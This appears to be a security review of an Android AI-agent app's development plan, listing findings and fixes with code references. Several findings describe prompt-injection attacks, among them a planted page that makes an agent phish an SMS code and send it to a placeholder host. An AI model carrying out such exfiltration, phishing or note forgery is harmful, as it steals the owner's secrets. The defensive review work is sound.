# Phase 6 plan: security and owner-safety critique

Critic: security and owner safety. Read in full: scratchpad/phase6-plan.md (984 lines), the four reader reports and
owner-typing-bug.md in scratchpad/phase6/, docs/ARCHITECTURE.md, docs/STATUS.md, docs/LIMITATIONS.md. I re-checked the
code at the current HEAD of /home/user/rune-companion. Nothing in the repository was changed, and nothing was built.

Tags: **[V]** read in the code at file:line (paths relative to the repo; `fw/` = framework/src/main/kotlin/com/aicontrolcenter/framework,
`core/` = core/src/main/kotlin/com/aicontrolcenter/core, `app/` = app/src/main/java/com/aicontrolcenter/app,
`dev/` = device/src/main/kotlin/com/aicontrolcenter/device); **[D]** official Android documentation (URL and version
given); **[A]** assumption or inference.

Severity follows the plan's own scale (section 9). **Critical** means an owner rule is broken. **Major** means a stated
guarantee is broken by crafted input or by a plain path, or an owner rule is weakened. **Minor** means a narrow edge that
fails safe, or wording.

## Summary

There are no critical findings. **17 major** and **12 minor** findings follow, plus **13 missing non-negotiable rules**
(section 3). The plan's own safety choices hold, and I checked them against the code (section 4): approvals are never
answered from a notification, no routines by default, scripts run in an isolated process, keys stay out of the backup,
and a restore grants nothing. The weak points are where Phase 6 adds new trust boundaries without naming them:

- the backup file, which is untrusted input that can bring back key references and relaxed settings;
- the script process, which becomes untrusted, yet some limits stay inside it;
- the question channel, which lets agent text reach the owner's eyes and notifications;
- background entry points (the upkeep job, an accessibility rebind) that open the database or touch the graph without
  the owner.

| # | Sev | Plan section | Finding (short) |
|---|---|---|---|
| S1 | major | §0, §5 WP13/WP14, §10 steps 1-3, 7, 17 | Plan is stale against HEAD 9c739d5 (0.5.2, `com.aicontrolcenter.hq`, versionCode 8) |
| S2 | major | §3 rule 3, WP8 architecture tests | `SettingsRepository.update` (local-only, both operator switches) is reachable from agent-facing code; Phase 6 adds more safety settings behind it |
| S3 | major | §3 rule 8, WP3, WP2.9 | Restore can reattach vault keys by `apiKeyAlias`, because Start over keeps the vault |
| S4 | major | §3 rule 8, WP3 | Restore applies the file's settings and can turn local-only mode or auto-resume back on/off silently |
| S5 | major | WP3 contents | Backup "conversations with text entries" carries tool results: other apps' screen text, shared-folder files, web pages |
| S6 | major | WP3 | 10-character owner passphrase + PBKDF2 for a file built to leave the phone |
| S7 | major | WP3, WP10, owner-typing-bug.md | Passphrase, typed "Start over" word, answers and notes are typed into fields that drop or reorder characters; IME learning; no FLAG_SECURE |
| S8 | major | WP3 | Restore says nothing about memory scopes: private memory must never be re-scoped into a shared space or to another agent |
| S9 | major | §3 rule 11, WP6 | Script limits (20 files, string size, write permission per run) stay inside the now-untrusted script process; host calls are identified by a caller-supplied `runId` |
| S10 | major | WP5.1, WP8 routes, WP11 question screen | Questions reuse the Approval route and screen, and agent-chosen option buttons can mimic approval buttons |
| S11 | major | WP2.6 | Question text (agent-written) would appear in a high-importance notification, readable by notification listeners |
| S12 | major | §3 rule 13, WP11 | The secret check on answers only warns; an injected agent can phish an SMS code and send it out with `web.read_page` |
| S13 | major | WP7.1, K4 | Owner notes carry "the same weight as the objective" but can be forged by agent text; `ObjectiveJournal.send` accepts any `from`/`type` |
| S14 | major | WP4.3, WP4.4, WP7.5 | Automatic OFFLINE marking and vision routing silently move an agent to a fallback farther from the phone |
| S15 | major | §1 goal 1, WP2.1, rule 12 | Long screen-off runs: screen actions are not refused while the screen is off (only while the keyguard is locked) |
| S16 | major | WP2.8 (G7), AiControlCenterApp | `AppScopeExceptionHandler` turns fail-stop into fail-silent for the approval and screen-session notifiers |
| S17 | major | WP2.9, WP2.12, rule 1 | The upkeep job and an accessibility-service rebind can open the database first after an update, before the safety copy; the job touching `graph` starts notifiers and rechecks |
| S18 | minor | WP2.7-8 | Script-process exits (watchdog kill, OOM) would count as app crashes and can trigger safe start |
| S19 | minor | WP6 AIDL | `in Bundle outcome` from the untrusted process; no off-binder-thread rule for host calls |
| S20 | minor | §3 rule 7, §4 | "Numbers only" contradicts `provider_checks.message` and `app_exits.description/state_summary` (text) |
| S21 | minor | WP10 "Share a problem report" | Problem-report contents are not specified as an allow-list shown before sharing |
| S22 | minor | WP5.5, K7 | Screen holds keyed by agent name; `endSession(agentName)` from another run of the same agent can drop a hold |
| S23 | minor | WP2.9, WP10 Recovery | Start over leaves saved API keys and Android-level folder grants behind; owner believes everything was reset |
| S24 | minor | WP3 restore | Restore races: "empty app" check vs a live chat turn; no restore-in-progress gate |
| S25 | minor | WP11 photo | Picture re-encoding/EXIF removal not stated; vision fallback can change where it goes (see S14) |
| S26 | minor | Phase 5 surface, WP3, WP11 | System pickers (DocumentsUI, Photo Picker) are not protected from screen control; Phase 6 adds two picker flows |
| S27 | minor | MainActivity, WP8 routes | Exported MainActivity accepts request and objective extras from any app; new routes must not add entry points |
| S28 | minor | WP5.1, WP7.1 | ANSWER and GUIDANCE bodies go into the activity log's first line (a pasted secret lands in the log) |
| S29 | minor | WP4.2, K11 | Daily limit: check-then-call race under 2 tasks at once; `OwnerUsage.clearHistory()` may reset today's count |

---

## 1. Findings in detail

### S1 (major): the plan is built on a stale HEAD

- **Evidence [V].** `git log` shows HEAD **9c739d5** "0.5.2: the app's Android name becomes com.aicontrolcenter.hq". The
  plan says HEAD d7315fd (plan :4, §0). app/build.gradle.kts:13 `applicationId = "com.aicontrolcenter.hq"`, :16
  `versionCode = 8`, :17 `versionName = "0.5.2"`. STATUS.md:422-430: 0.5.2 "does not update 0.5.0 or 0.5.1: it
  installs beside them, with its own data".
- **Problems.**
  1. The plan gives 0.6.0 versionCode 8 (plan :5, §10 step 1), but 0.5.2 already uses 8.
  2. §0 says "0.5.1 and 0.6.0 install over 0.5.0 and keep the data". That is false now.
  3. §10 step 2 ("Install 0.5.1 … install 0.6.0 over it") cannot be done.
  4. Steps 3, 7 and 17 address `com.aicontrolcenter.app`, so they would test nothing.
- **Owner safety.** The owner may now have two apps called "AI Control Center": the old one, with its keys and possibly
  its accessibility service on, and the new one. 0.5.x has no backup feature, so the plan's backup cannot carry the
  owner's data across.
- **Fix.**
  - Rebase the plan on 9c739d5: 0.6.0 = versionCode **9**.
  - Upgrade e2e: 0.5.2 → 0.6.0.
  - Use the package `com.aicontrolcenter.hq` in every adb step.
  - Add a WP14 owner text, "Removing the old app": switch off the old app's accessibility service, then uninstall it.
    Its data cannot be moved; agents and keys must be entered again.
  - The accessibility service label gains nothing new, but STATUS must say there may be two entries in Android's
    accessibility list.
  - Keep the 0.5.2 commit's claim under test: the self-protection prefix `com.aicontrolcenter.` (core/operator/ConsequentialControls.kt:292)
    covers both names, so neither app operates the other.

### S2 (major): the settings writer is reachable from agent-facing code

- **Evidence [V].** `SettingsRepository` has `update(transform)` (core/settings/FrameworkSettings.kt:50-57). That one
  call can switch off `localOnlyMode` (:12) and switch on `operatorEnabled` (:38), `accessibilityOperatorEnabled` (:40)
  and `autoResumeInterruptedTasks` (:34).
- The full repository is held by agent-facing classes:
  - `OperatorFacts`, held by the broker (fw/operator/OperatorFacts.kt:29-31; PermissionBroker.kt:95-96). Its comment
    says "It only reads", but its type can write.
  - `AgentRunner` (fw/agents/AgentRunner.kt:93), `DefaultModelGateway` (fw/llm/DefaultModelGateway.kt:56),
    `DefaultAgentChat` (fw/chat/DefaultAgentChat.kt:97) and `OrchestrationContext` (fw/orchestration/OrchestrationContext.kt:29).
- Neither architecture test lists it as owner-only: app/src/test/.../di/OperatorDependencyTest.kt:62-68 and
  framework/src/test/.../operator/OperatorDependencyTest.kt:34-38.
- ARCHITECTURE.md:222-226 promises the test "fails if it can reach … any store that could change access".
- Phase 6 adds more safety settings behind the same writer: `maxModelCallsPerDay`, `maxTokensPerDay`,
  `agentQuestionsEnabled`, `ownerQuestionTimeoutMinutes` (5..240) and `keepAwakeWhileAgentsWork` (plan §4). It also
  hands the settings to new agent-facing code: the gateway's `limits` lambda, `OwnerQuestions` and `ProviderRechecks`.
- **Fix (WP1a and WP8).**
  - Split the port into `SettingsView` (`settings`, `get()`) for everything agent-facing, and an owner-only
    `OwnerSettings.update` for the UI.
  - Bookkeeping writes (`seedVersion`, `memorySeedVersion`, `directorAgentId`: fw/agents/DefaultAgentManager.kt:170, :230;
    fw/memory/MemorySeeder.kt:70) go through a narrow `SeedBookkeeping` port that can write only those three fields.
  - Add `SettingsRepository`/`OwnerSettings` to both owner-only lists, and add `update` to `ownerOnlyActions`.
  - Add `DefaultModelGateway`, `DefaultAgentChat`, `OwnerQuestions`, `IsolatedJsEngine`'s host and `ProviderRechecks`
    to the framework test's `agentFacingRoots` (:73-77) and to the app test's `roots()` (:162-164).

### S3 (major): restore can reattach saved keys to the file's addresses

- **Evidence [V].**
  - A key is found only through the record's alias: `readKey` → `vault.get(provider.apiKeyAlias)` (fw/llm/ProviderConnections.kt:139-150).
  - The alias is `provider/<providerId>/<n>` (fw/llm/DefaultProviderManager.kt:476-483).
  - `deleteUnusedKeys` keeps every key whose provider has no readable record (:440-462).
  - The plan's "Start over" leaves the vault as it is (WP2.9).
  - So after Start over, every old key survives. A restored provider record with the same id and an `apiKeyAlias`
    field gets its key back, with whatever `baseUrl` the file holds. "Providers without keys" (WP3) leaves out the key
    material, not the alias.
  - Rule 8 and e2e step 15 ("providers ask for the key") would both be false.
  - The binding "a key goes only to the address it was entered for" (STATUS.md:92-94) would rest on the file's
    integrity instead of the key-entry flow.
- **Fix.**
  - The backup writer omits `apiKeyAlias`, `status`, `statusMessage` and `lastCheckedAt`.
  - The restorer sets `apiKeyAlias = null`, `status = UNKNOWN`, and recomputes `locality` with `Locality.infer`
    (`effectiveLocality` already takes the farther of the two, core/registry/Models.kt:128-129 [V], so local-only stays
    safe; recomputing makes it explicit).
  - It runs `ProviderDraftValidator` on name, address and headers (credential headers refused, ProviderDraftValidator.kt:28-29 [V]).
  - Start over deletes the vault's `provider/*` entries, or at least makes restore unable to reattach them.
  - Test (JVM): the vault holds `provider/p1/1`; restore a file with provider `p1` at `https://other.example` and alias
    `provider/p1/1`. Expect a stored alias of null, and zero requests carrying the key to the mock server.

### S4 (major): restore can silently change protective settings

- **Evidence.** WP3 restores "settings with both operator switches off". `FrameworkSettings` also holds `localOnlyMode`,
  `autoResumeInterruptedTasks` and `approvalTimeoutMinutes` [V, FrameworkSettings.kt:12, :32, :34], plus the new daily
  limits.
- The settings DataStore survives Start over (reader-background R5: "Settings in DataStore survive").
- An owner who switched local-only on, then restores a file from before that, has it switched off without being told.
  The next model call then goes to the cloud.
- **Fix.** Rule 8 gains "restore never relaxes protection":
  - `localOnlyMode` = current OR file.
  - Both operator switches: off.
  - `autoResumeInterruptedTasks`: off.
  - Daily limits: the stricter of current and file.
  - Time-outs and other orchestration limits: the current values.
  - The inspect screen lists every setting that would change ("Local-only mode: stays on").
  - Test: current local-only on, file local-only off → still on.

### S5 (major): the backup would carry tool results from chats

- **Evidence [V].** A `ConversationEntry` stores a whole `ChatMessage` (core/chat/Conversation.kt:27-38), tool messages
  included. WP3 backs up "conversations with their text entries", so it would export:
  - `screen.read` texts of other apps (banking or messaging screens the owner let an agent read);
  - shared-folder and workspace file contents;
  - web pages.
- All of this goes into a file the plan expects to leave the phone ("The app you choose may send it off the phone",
  rule 21).
- The owner rule against accessing another app's private data is about reading. Bulk export widens what one authorised
  read exposes.
- **Fix.**
  - Conversations in the backup keep only owner messages and the agent's own reply text.
  - Tool calls and tool results are replaced by one line each ("A tool was used here: Read screen (SIM Toolkit). Its
    result is not in the backup.").
  - Rule 8 gains "no tool results".
  - Test: a chat with a `screen.read` result round-trips without that text (grep the decrypted body in the JVM test).

### S6 (major): the passphrase is too weak for a file meant for the cloud

- **Evidence.** WP3 accepts any passphrase of at least 10 characters, with PBKDF2-HMAC-SHA256 at 600,000 iterations.
  The file holds every memory and chat, and the plan expects cloud storage.
- A human-chosen 10-character passphrase ("Fluffy2024!") falls to dictionary-plus-rules attacks offline. The iteration
  count only buys a constant factor [A: order of 10^4 guesses per second per current GPU at 600k iterations].
- **Fix.**
  - By default, generate a passphrase: 6 words from a built-in list of 2,048 or more, about 66 bits. Show it once with
    "Write this down; nobody can open the file without it".
  - "Use my own" requires 16 or more characters or 4 or more words, plus a simple common-password check.
  - Keep PBKDF2 with the header bounds as planned.
  - The wording stays plain.

### S7 (major): fields where a mistyped character costs the owner their data

- **Evidence.** owner-typing-bug.md (written 2026-11-25 04:41, after the plan, which does not mention it) confirms that
  fields fed through `combine(...).stateIn` drop and reorder characters (NewObjectiveViewModel.kt:89-112 as cited
  there). Phase 6 adds:
  - the backup passphrase, entered twice (a deterministic reorder passes the twice-check and locks the owner out of
    their own backup);
  - the typed "Start over" word, twice;
  - question answers;
  - notes;
  - price fields.
- WP3 also says the passphrase is "held as CharArray and cleared". A Compose text field holds a `String`/`TextFieldState`,
  so that claim cannot be met as written [A].
- **Fix.**
  - Add the typing fix to WP1a/WP8 as a rule: every new field uses `TextFieldState` (the `state =` overload). The plan
    must name the passphrase, confirm-word, answer and note fields.
  - Passphrase fields: Material 3 `OutlinedSecureTextField` or `KeyboardType.Password` with autocorrect off, so the
    keyboard does not learn them.
  - `WindowManager.LayoutParams.FLAG_SECURE` on the passphrase, Recovery and backup screens (no screenshots or Recents
    thumbnails).
  - Change "held as CharArray" to "never stored, never logged, cleared from the view model when the screen closes".
  - Test: a fast `performTextInput` with the frame clock paused on each new field.

### S8 (major): memory scopes on restore are unspecified

- **Evidence.** WP3 restores "spaces; memories with links, provenance and history" and replaces the starter team. It
  says nothing about how `Agent(id)` and `Shared(space)` scopes are mapped (ARCHITECTURE.md:276-279), or what happens to
  a memory whose agent or space is missing from the file.
- A remap that falls back to "the Director" or "Team knowledge" would break "Do not force all agents to share all
  memories".
- **Fix.**
  - Ids are restored as they are, with no remapping.
  - A memory whose scope owner is not in the file is dropped, counted, and named on the result screen; it is never
    re-scoped.
  - Agents' `MemoryPolicy` space lists are cut to spaces present in the file.
  - Test: private memories of agents A and B, a space readable by A only; after restore B cannot recall A's memory, and
    a memory of a missing agent is gone.

### S9 (major): the script process is untrusted, but limits stay inside it

- **Evidence [V].** These limits are enforced inside the sandbox, which WP6 moves into the isolated process:
  - "at most 20 files": `MAX_FILES_WRITTEN = 20` checked in `JsSandbox` (fw/operator/JsSandbox.kt:416-417, :669);
  - the read size check (:402) and the argument size check (:579).
- The app-side `WorkspaceJsHost` (fw/operator/ScriptTools.kt:138-180) checks only `canWrite`, never-overwrite, and the
  read cap.
- WP6's `IScriptHost.read(runId, path)` and `write(runId, path, pfd)` take a `runId` from the caller. With 2 runs at
  once, possibly for agents with different access, a compromised process could use the other run's id.
- **Fix.**
  - One `IScriptHost` binder object per run, created in the app with that run's agent, `canWrite`, counters and
    `runOver`. Drop `runId` from host methods, or check that it equals the object's own id.
  - The app-side host enforces the 20-file cap, the per-text size cap (read the PFD with a hard byte cap and a
    timeout), `canWrite`, and "no host call after the run is over" (JsSandbox.kt:185-189).
  - The time limit is enforced app-side by unbind (already planned).
  - Rule 11 gains: "every limit that protects the app is enforced outside the script process".
  - `JsEngineContract` gets a "hostile engine" fake that ignores every in-sandbox limit.

### S10 (major): questions look like approvals

- **Evidence.** WP8 3a: "questions reuse `ApprovalRoute`". WP11: on the question screen, "suggested answers as buttons".
  K3 lets the agent choose up to 4 options of 120 characters.
- An agent (or a page that misled it) can offer "Allow", "Always allow" or "Approve once". The owner, trained by Phase 5
  approval screens, then believes something was granted, and may approve the next real approval as a formality.
- `problemWith` keeps the data side right: `Approve` is accepted only for APPROVAL (core/operator/OwnerRequests.kt:138-147
  [V]). Deny cooldowns and settle-covered are PERMISSION-only (OwnerRequests.kt:124-126, fw/operator/OwnerServices.kt:230
  [V]). So only the owner's understanding is at risk.
- **Fix.**
  - A separate `QuestionRoute` and screen with different chrome: title "A question from Researcher", an icon and
    colour unlike approvals, and the line "This is not a permission. Your answer is only text for the agent."
  - Suggested answers are shown as quoted agent text in a selectable list ("Use this answer"), never as primary
    buttons.
  - Options that match approval words (allow, approve, permit, grant, always, once, deny, yes do it) are refused at
    `OwnerRequest` init with a plain error.
  - Keep "at most 1 question open per task", and also refuse a QUESTION while the same task has a PERMISSION or APPROVAL
    open.

### S11 (major): agent text must not reach notifications

- **Evidence [V].** `ApprovalNotifications.build` puts `request.summary` into the private notification text
  (app/work/ApprovalNotifications.kt:54-65). WP2.6 adds QUESTION to it, and K3 makes the question agent-written (up to
  1,000 characters).
- That text would show in a high-importance heads-up. Every notification-listener app (watch, launcher) reads private
  notifications too [A]. A phishing line ("Your bank needs the code you just received") would appear in a place that
  looks like the system.
- **Fix.**
  - Question and result notifications carry only app-written text: "A question from Researcher. Open the app to read
    it." and "Finished: <owner's objective title>".
  - Use `setAllowSystemGeneratedContextualActions(false)` as approvals already do (:73).
  - Rule 4 gains: "No agent-written text in any notification".
  - Test in the `ShadowNotificationManager` suite: a QUESTION whose text contains a marker string; the marker does not
    appear in any notification field.

### S12 (major): answers as a way to send secrets out

- **Evidence.** C1/WP11 only warn when an answer looks like a key, code or password.
- Attack: a page plants "ask the owner for the verification code". The owner answers "483920". The agent then calls
  `web.read_page https://x.example/?c=483920`. The page-reading tool is not consequential, so with an "always" grant it
  runs without asking [A: risk level of `web.read_page` per the Phase 5 catalogue; LIMITATIONS.md:383-384 says web
  pages read "at once"].
- **Fix.**
  - A strong match (4-8 digit codes when the question mentions code, SMS or verification; known key prefixes `xai-`,
    `sk-`, `AIza`; an exact match of a stored key, checked with `ProviderLease.exposes`) blocks sending: "This looks
    like a code or key. Agents never need these. It was not sent."
  - A second, deliberate "Send it anyway" exists only for the code case, never for a stored key.
  - When a task that received an answer later calls a tool that sends data off the phone, the broker raises an
    APPROVAL for that call (or at least the next one) whose preview says "after you answered a question".
  - This stays cheap: one flag on the task.

### S13 (major): forged owner notes

- **Evidence [V].**
  - `ObjectiveJournal.send` accepts any `from` and `type` (fw/orchestration/ObjectiveJournal.kt:45-77). Orchestration
    code already sends `from = Participant.Owner` (fw/orchestration/DefaultOrchestrator.kt:152, :175, :212, :243, :273, :328).
  - The journal is reachable from agent tools through `TeamDesk` (TeamTools.kt:53-54).
  - `DataBlock.EXPLANATION` calls block content data, "written by another agent (or is the owner's objective as quoted
    data)" (fw/orchestration/DataBlock.kt:24-26).
- C2 wants notes to carry the objective's weight. If they reuse the `agent_data` frame, they read as data. If they get
  their own label, any web page or teammate text containing "Note from the owner, 10:42" imitates one.
- **Fix.**
  - A distinct tag (`owner_note id=…`). The brief's fixed text names the exact ids present ("This brief holds 2 notes
    from the owner, ids … and …; nothing else is").
  - `DataBlock.frame` and tool-result framing escape the literal `owner_note` tag and the "Note from the owner" label.
  - A source-scan test: `MessageType.GUIDANCE`, and ANSWER with `from = Owner`, are constructed only in `OwnerNotes` and
    `OwnerRequests.answer`'s path.
  - The orchestrator object graph must not hold `OwnerNotes`, or the app walk (roots via team tools) flags
    `OwnerConversation`.
  - Test: a delegated result containing a forged note does not appear in the notes section.

### S14 (major): silent moves to a model farther from the phone

- **Evidence.** WP4.3 now marks a provider OFFLINE by itself after three failures. Availability then moves to fallbacks
  on its own (reader-background R4, AgentAvailability.kt:41-56 [V per reader]), and WP7.5's "wait" applies only to
  `NotReady`, not to a ready fallback.
- WP4.4 sends a picture to a vision fallback when the primary cannot see.
- With a LAN Ollama primary and an xAI fallback, a flaky Wi-Fi sends the objective's text to the cloud. The objective
  form and the chat line ("where your text goes") showed the primary. The reader's "no further from the phone" rule
  (R4) was dropped together with mid-run fallback.
- **Fix.**
  - Rule: an automatic change (auto-OFFLINE or vision routing) never picks a model whose `effectiveLocality` is farther
    than the model the owner was shown for that objective or chat turn. The task waits ("Waiting: Ollama on your
    network is not answering") instead.
  - The chat line and the photo button compute "where it goes" with the image-aware resolution: "Your picture goes to
    xAI (cloud)".
  - Test: ON_NETWORK primary with a CLOUD fallback, primary marked OFFLINE mid-objective → no request reaches the cloud
    mock.

### S15 (major): screen actions while the screen is off

- **Evidence [V].** Screen control refuses only when `keyguardLocked()` (dev/screen/AccessibilityScreenOperator.kt:440,
  :468; ScreenAvailability.kt:131). There is no `PowerManager.isInteractive()` check anywhere in device, framework or
  app (grep).
- Goal 1 ("put the phone away") and the wake lock make screen-off runs normal. On a phone with no lock screen, or
  during the lock delay, an authorised app set to "ask only before buying" can be operated with nobody watching. Rule
  12's banner is then on a dark screen.
- **Fix.**
  - Rule 12 gains: "Screen actions run only while the screen is on and not locked". Add `isInteractive()` to
    `DeviceFacts`, and refuse with "The phone's screen is off. Screen actions wait until you use the phone."
  - Device Robolectric test with `ShadowPowerManager.setIsInteractive(false)`.

### S16 (major): a crash in a safety notifier becomes silent

- **Evidence [V].** `ApprovalNotifier`, `ScreenSessionNotifier` and `ObjectiveWorkController` run as children of
  `appScope = CoroutineScope(SupervisorJob() + Dispatchers.Default)` (app/AiControlCenterApp.kt:26, :48-52).
- Today an escaped exception ends the process (reader G7), which stops everything. That is fail-stop.
- WP2.8 adds `AppScopeExceptionHandler`, which "keeps the process for `Exception`". The failed collector stays dead
  while agents go on: no more approval notifications, and no "is operating · Stop" notification during screen control.
- **Fix.**
  - Safety collectors run under a supervisor that restarts them with backoff, and logs a WARNING.
  - If `ScreenSessionNotifier` cannot be restarted, `StopSwitch` stops screen control. If the controller dies, running
    objectives pause.
  - Test: inject an exception into each collector's flow; it is restarted, or screen control is stopped.

### S17 (major): background database opens and the upkeep job's reach

- **Evidence.**
  - `SafetyCopy` runs in `DatabaseHealth.check()` "before the shell" (WP2.9, MainActivity gate). But after an app
    update, Android rebinds an enabled accessibility service, and the upkeep job can run before the owner opens the app
    (reader G4) [A for rebinding timing]. Either can open Room first, so the 5→6 migration runs without the safety copy
    and outside the Recovery classification.
  - The job must reach stores. `AiControlCenterApp.graph` starts `ObjectiveWorkController`, `ApprovalNotifier` and
    `ScreenSessionNotifier` on first access (AiControlCenterApp.kt:44-54 [V]). Building `AppGraph` with WP8's
    `ProviderRechecks` and `NetworkStatus` would also arm provider re-checks, which send the key to xAI, from a
    background job.
  - Rule 1's reachability test, walking from `UpkeepJobService`, fails trivially if the job uses `graph`, or proves
    nothing if it does not.
- **Fix.**
  - Move the safety copy and the classification into `DataLayer`'s open path: the first open in any process component.
  - The job uses a small `UpkeepGraph` built from `DataLayer` stores and the hashing embedder only, never
    `AiControlCenterApp.graph`. Test: the job's source does not name `graph`.
  - Robolectric: run the job with a recording HTTP layer → zero requests, zero `provider_checks` rows.
  - The job does nothing while `DatabaseHealth` is not OK, during safe start, or during a restore.

### S18 (minor): script-process deaths counted as app crashes

- **Evidence [D].** `ApplicationExitInfo.getProcessName()` gives "the actual process name". For isolated processes,
  `getRealUid()` differs from `getPackageUid()`
  (https://developer.android.com/reference/android/app/ApplicationExitInfo, API 30+).
- WP2.8 counts "three CRASH/CRASH_NATIVE/ANR exits within 15 minutes" without filtering by process. A script that
  exhausts its heap three times puts the app into safe start, and the "Interrupted: an error in the app" texts would be
  wrong.
- **Fix.** Safe start and interrupted texts use exits of the main process only (`processName == packageName`).
  Script-process exits are stored as their own kind ("A script was ended").

### S19 (minor): AIDL hardening

- `IScriptResult.done(runId, in Bundle outcome)`: the app unparcels a `Bundle` from the less-trusted side.
- **Fix.**
  - Typed primitive parameters (status int, `String` JSON capped and parsed with the app's own parser), no `Bundle`,
    `Parcelable` or `Serializable` from the script process.
  - Host calls are served off binder threads with at most one outstanding call per run.
  - Bind with `BIND_WAIVE_PRIORITY` [A] so memory pressure lands on the script process first.

### S20 (minor): "numbers only" contradicts the planned columns

- Rule 7 promises no content and no addresses. §4 has `provider_checks.message` (provider text, may hold a host name or
  an address) and `app_exits.description` (free text "given by the system; could be null … no guarantees that the
  format is stable" [D, ApplicationExitInfo#getDescription]) plus `state_summary`.
- **Fix.** Drop `description`. `state_summary` holds only the app's own small JSON of ids. `message` is the existing
  redacted text (`ProviderLease.redact`, ProviderConnections.kt:178 [V]), cut to 200 characters with addresses replaced.
  The column allow-list test names these three explicitly.

### S21 (minor): problem report contents

- **Fix.** An allow-list: app version, Android version and API level, exit kinds and times, crash classes and the first
  20 `com.aicontrolcenter` frames, counts. No provider addresses, agent names, objective titles, activity log or
  descriptions. Shown in full before the share sheet. Written to `cache/exports/` (the only FileProvider path,
  app/src/main/res/xml/export_paths.xml [V]) and deleted after sharing.

### S22 (minor): screen holds keyed by name

- Screen sessions are keyed by `agentName` (core/operator/Screen.kt:275-321). `endSession(agentName)` runs when "that
  agent's run or task ends" (:320-321). The same agent can run two tasks at once (`maxConcurrentTasks` 2), plus a chat.
- **Fix.** Holds are reference-counted per request id. `endSession` never ends a session with an open hold. Test: run 2
  of agent X ends while run 1's tap waits; the banner stays.

### S23 (minor): Start over leaves things behind

- Saved API keys stay in the vault (WP2.9, S3), and Android-level persisted folder grants stay with the app.
- **Fix.** Start over also deletes the vault's provider keys (or asks "Also forget your saved keys", default yes) and
  calls `releasePersistableUriPermission` for every persisted grant. It resets `seedVersion` and `memorySeedVersion`. The
  Recovery screen says exactly what remains.

### S24 (minor): restore races

- **Fix.** Restore takes a global "restore in progress" gate that refuses new objectives and chat turns. "Empty" is
  checked inside the restore transaction. A live turn means refusal ("Stop the chat first").

### S25 (minor): pictures

- **Fix.** State that the picture is decoded, downscaled and re-encoded, so no EXIF and no location is sent, and that it
  is never forwarded as the original bytes. Where it goes: see S14.

### S26 (minor): system pickers are not protected

- `PROTECTED_PACKAGES` and `PROTECTED_HANDLER_ACTIONS` (core/operator/ConsequentialControls.kt:256-289 [V]) do not cover
  DocumentsUI or the Photo Picker. These are Android's consent screens for storage. Phase 6 adds CREATE_DOCUMENT and
  OPEN_DOCUMENT (backup) and PickVisualMedia (photo).
- **Fix.** Add the handler actions `android.intent.action.OPEN_DOCUMENT`, `OPEN_DOCUMENT_TREE`, `CREATE_DOCUMENT` and
  `android.provider.action.PICK_IMAGES` to `PROTECTED_HANDLER_ACTIONS`, keeping the `<queries>` list and
  `QueriesManifestTest` in step.

### S27 (minor): entry points on the exported activity

- `MainActivity` is exported (AndroidManifest.xml:32-40). It reads `EXTRA_OBJECTIVE_ID` and `EXTRA_REQUEST_ID` from any
  intent (MainActivity.kt:31-35 [V]). Request ids are random, so the risk is low.
- **Fix.** Rule: no new extras or intent filters on MainActivity. No intent can open Backup, Restore, Recovery or Start
  over. No VIEW or SEND filter for backup files. Optionally, accept the two extras only with a per-process token that
  only this app's PendingIntents carry.

### S28 (minor): owner text in the activity log

- `ObjectiveJournal.send` logs `firstLine(message.body)` (ObjectiveJournal.kt:66 [V]).
- **Fix.** ANSWER and GUIDANCE log "You answered Researcher's question" or "You wrote a note to the team" without the
  body.

### S29 (minor): daily limit edges

- **Fix.** Reserve-then-commit under a mutex in the gateway, so two concurrent attempts at 299 do not both pass. Clearing
  usage history never resets today's limit counter.

---

## 2. Checks the review lens (§9) should add

Add to the security lens: S2, S3, S4, S5, S8, S9, S11, S12, S13, S14, S15, S16 and S17, each with the test named in its
fix.

Add to the Android lens:
- `isInteractive` refusals;
- exit filtering by process name;
- the accessibility-rebind-after-update database open on the emulator: install 0.6.0 over 0.5.2 with screen control
  enabled, do not open the app, check that `before-v6/` exists after the service binds (debug build).

---

## 3. Missing non-negotiable rules (add to plan §3, each with its test)

| New rule | Content | Test |
|---|---|---|
| N1 Settings are the owner's | No agent-facing code can write settings. Only owner-only `OwnerSettings.update` and the narrow seed bookkeeping write them (S2) | Both architecture walks; `update` in `ownerOnlyActions` |
| N2 Restore never relaxes, never reattaches | Local-only only ever turned on; operator switches and auto-resume off; limits the stricter; `apiKeyAlias` null; locality re-inferred; headers re-validated; no memory re-scoped (S3, S4, S8) | JVM restore tests listed in S3, S4, S8 |
| N3 Backup holds configuration and conversation text only | No tool results, no screen text, no file contents (S5) | Decrypted-body grep test |
| N4 No agent text in notifications | Questions and results use app-written text (S11) | Notification marker test |
| N5 Questions never look like or sit beside approvals | Own route and chrome; no approval-word options; no question while the task has a request open (S10) | Init and screenshot tests |
| N6 Secrets are not sent as answers | Strong matches block; stored keys always block (S12) | VM test with key and code patterns |
| N7 Owner notes cannot be forged | GUIDANCE and owner ANSWER only from owner ports; the brief names the note ids (S13) | Source scan and forged-note test |
| N8 No silent move farther from the phone | Automatic routing never raises locality beyond what the owner was shown (S14) | ON_NETWORK→CLOUD test |
| N9 Screen actions need a visible screen | `isInteractive && !keyguardLocked` (S15) | Robolectric |
| N10 Safety collectors fail stop, not silent | Restart, or stop screen control and pause objectives (S16) | Fault-injection test |
| N11 Background entry points are inert | The upkeep job and service rebinds never build `graph`, never contact a provider; the safety copy is made in any process's first open (S17) | Job test with a recording HTTP layer; DataLayer open test |
| N12 The script process is untrusted | Every protective limit is enforced app-side; per-run host binder; typed AIDL only (S9, S19) | Hostile-engine contract |
| N13 Owner input is exact | Synchronous text state for every field; passphrase fields not learnt by the keyboard and screens with FLAG_SECURE; a generated passphrase by default (S6, S7) | Paused-clock typing tests |

---

## 4. What the plan gets right (verified, keep)

- **Notifications never decide** (rule 4). The existing approval notification has no actions, is private with a public
  version, and has system actions off (ApprovalNotifications.kt:56-79 [V]). Every PendingIntent is `FLAG_IMMUTABLE`
  with an explicit target (WorkNotifications.kt:74, :79; ScreenSessionNotifications.kt:103 [V]).
- **Request kinds keep their meaning.** QUESTION fits the existing invariants: `grantFor` requires PERMISSION
  (OwnerRequests.kt:154-162), the refusal cooldown is PERMISSION-only (:124-126), and settle-covered skips other kinds
  (OwnerServices.kt:230) [V]. Rule 2's "yes, do it leaves approvals PENDING" test is the right one.
- **No routines by default, and the job starts no work** (§2, rule 1). This is the main defence against unattended
  spending. Q1's wording is honest.
- **Isolated process.** It has "no permissions of its own"
  (https://developer.android.com/guide/topics/manifest/service-element, all versions), so it has no network and no app
  files. It is a real narrowing, provided S9 is fixed.
